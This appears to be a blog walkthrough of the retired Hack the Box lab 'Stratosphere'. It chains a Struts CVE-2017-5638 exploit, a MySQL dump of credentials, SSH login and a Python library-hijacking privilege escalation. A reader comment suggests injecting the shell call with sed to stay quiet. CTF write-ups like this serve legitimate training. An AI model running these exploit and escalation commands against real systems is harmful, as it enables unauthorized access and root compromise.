@@ -1,0 +1,341 @@
+
+								
+																		Hack the Box: Stratosphere Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on September 4, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Stratosphere” which is a lab presented by Hack the Box and is available online for those who want to increase their skills in penetration testing and black box testing. Stratosphere is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Easy
+Task: find user.txt and root.txt file in the victim’s machine.
+WalkThrough
+Since these labs are online available therefore they have static IP. The IP of Stratosphere is 10.10.10.64
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.64
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.64
+					
+				
+			
+		
+
+
+As per nmap port, 80 is open for HTTP let’s explore the target IP in the browser. After exploring port 80, we were welcomed by the following page where we didn’t found any informative clue. 
+
+After then we visit Port 8080 for HTTP proxy and here also we get the same web page. We try to inspect the source code of port 80 and 8080 but we got nothing.
+
+Therefore next we decided to have directory brute force attack with help of Dirbuster and used wordlist “dictionary-list-2.3-medium.txt” for the attack.
+
+Luckily it fetched some web directories such as /Monitoring, let’s explore it in the web browser.   
+
+So when we try to open the URL http://10.10.10.64:8080/Monitoring then it gets a redirect to http://10.10.10.64:8080/Monitoring/example/Welcome.action for login. I closely look at the URL containing .action extension, so I made Google search to extract complete information related to this extension. I found action extension is utilized by apache struts2 which has a history of bugs and vulnerabilities and if you will search for its exploit, you will get a lot of python scripts and exploits to compromise this service.
+
+So we used nmap script to identify its state of vulnerability
+
+		
+		
+			
+			
+			
+			
+nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64
+			
+				
+					
+				
+					1
+				
+						nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64
+					
+				
+			
+		
+
+Awesome!!! It is vulnerable to cve2017-563, let’s exploit it.
+
+I found an exploit Struts-Apache-ExploitPack, let’s download it from git hub and give full permission.
+
+		
+		
+			
+			
+			
+			
+git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.git
+cd Struts-Apache-ExploitPack
+cd Exploiter
+ls
+chmod 777 Exploit.sh
+			
+				
+					
+				
+					12345
+				
+						git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.gitcd Struts-Apache-ExploitPackcd Exploiterlschmod 777 Exploit.sh
+					
+				
+			
+		
+
+ 
+Now run the following command to exploit the victim machine.
+
+		
+		
+			
+			
+			
+			
+./Exploit.sh http://10.10.10.64:8080/Monitoring/example/Welcome.action
+id
+ls
+cat db_connect
+Username: admin
+Password: admin
+			
+				
+					
+				
+					123456
+				
+						./Exploit.sh http://10.10.10.64:8080/Monitoring/example/Welcome.actionidlscat db_connectUsername: adminPassword: admin
+					
+				
+			
+		
+
+
+So now we have database credential, let’s utilized them for getting all the information from inside the database. 
+
+		
+		
+			
+			
+			
+			
+mysqldump -u admin -padmin --all-databases --skip-lock-tables
+			
+				
+					
+				
+					1
+				
+						mysqldump -u admin -padmin --all-databases --skip-lock-tables
+					
+				
+			
+		
+
+Here I found Password “9tc*rhKuG5TyXvUJOrE^5CK7k” for user Richard, now let’s try to connect with SSH using these credential.
+
+
+		
+		
+			
+			
+			
+			
+ssh richard@10.10.10.64
+			
+				
+					
+				
+					1
+				
+						ssh richard@10.10.10.64
+					
+				
+			
+		
+
+Yuppie we successfully logged in victim’s machine, so now let get the user.txt and root.txt
+
+		
+		
+			
+			
+			
+			
+ls
+cat user.txt
+cat test.py
+			
+				
+					
+				
+					123
+				
+						lscat user.txtcat test.py
+					
+				
+			
+		
+
+Here we notice that test.py was computing some hash values and at the end, it will give success.py from inside the root directory and the whole script depends upon hashlib. 
+
+Then we also check sudo rights for Richard and found he has sudo right to run all type of python script. So very first we check test.py file and start solving hashes in order to get success.py
+
+		
+		
+			
+			
+			
+			
+sudo /usr/bin/python /home/richard/test.py
+			
+				
+					
+				
+					1
+				
+						sudo /usr/bin/python /home/richard/test.py
+					
+				
+			
+		
+
+
+So we got the hash value, now we need to decode it and after decoding I found “kayboo!”
+
+On submitting the decoded text, it generated a new hash for further step and again I decode it and submit the answer and after then again a new hash and it was processing repetitively same at each time on submitting decoded text.
+Since test.py was importing hashlib which was a python library so I last option was python library hijacking to escalate the root privilege.    
+
+Therefore I create a hashlib.py script in the current directory to import system binary ‘/bin/bash’ and hence now when we will run the test.py then it will import hashlib.py which will calls /bin/bash binary file.
+
+		
+		
+			
+			
+			
+			
+echo 'import os;os.system("/bin/bash")' &gt; hashlib.py
+sudo /usr/bin/python /home/richard/test.py
+			
+				
+					
+				
+					12
+				
+						echo 'import os;os.system("/bin/bash")' &gt; hashlib.pysudo /usr/bin/python /home/richard/test.py
+					
+				
+			
+		
+
+Booom!!! Here we owned root access, now let’s get the root.txt file and finish this task.
+
+Author: Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								ion September 6, 2018 at 12:58 am							
+							
+							
+														
+							
+								Did you need to replace the contents of the hashlib library? Couldn’t you have inserted the import statement into the test.py script at the start?
+sed -i ‘/import hashlib/a import os;os.system(“/bin/bash”)’ test.py
+This way you wouldn’t have broken the library but still achieved the outcome that you wanted when run. Probably not as relevant here, but in a real-life pentest you’d want to be as quiet as possible, right?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
